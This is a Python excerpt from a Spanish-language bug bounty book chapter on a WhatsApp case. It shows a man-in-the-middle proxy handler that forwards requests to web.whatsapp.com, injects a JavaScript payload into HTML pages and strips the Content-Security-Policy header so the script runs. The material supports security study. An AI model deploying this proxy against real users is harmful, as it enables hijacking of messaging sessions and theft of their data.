# Extraído de: LibroBugBounty/cap-27-caso-whatsapp.md
class MITMHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        target_url = TARGET + self.path

        req = urllib.request.Request(target_url)
        for key, val in self.headers.items():
            if key.lower() not in ('host', 'connection',
                                    'accept-encoding'):
                req.add_header(key, val)
        req.add_header('Host', 'web.whatsapp.com')

        ctx = ssl.create_default_context()
        resp = urllib.request.urlopen(req, context=ctx, timeout=15)
        body = resp.read()
        ct = resp.headers.get('Content-Type', '')

        # Inyectar JS en respuestas HTML
        if 'text/html' in ct:
            text = body.decode('utf-8', errors='replace')
            text = text.replace('</head>', INJECT_JS + '</head>')
            body = text.encode('utf-8')

        self.send_response(resp.status)
        for key, val in resp.headers.items():
            # Eliminar CSP y headers que interfieren
            if key.lower() not in ('transfer-encoding',
                'content-length', 'content-encoding',
                'content-security-policy'):
                self.send_header(key, val)
        self.send_header('Content-Length', len(body))
        self.end_headers()
        self.wfile.write(body)
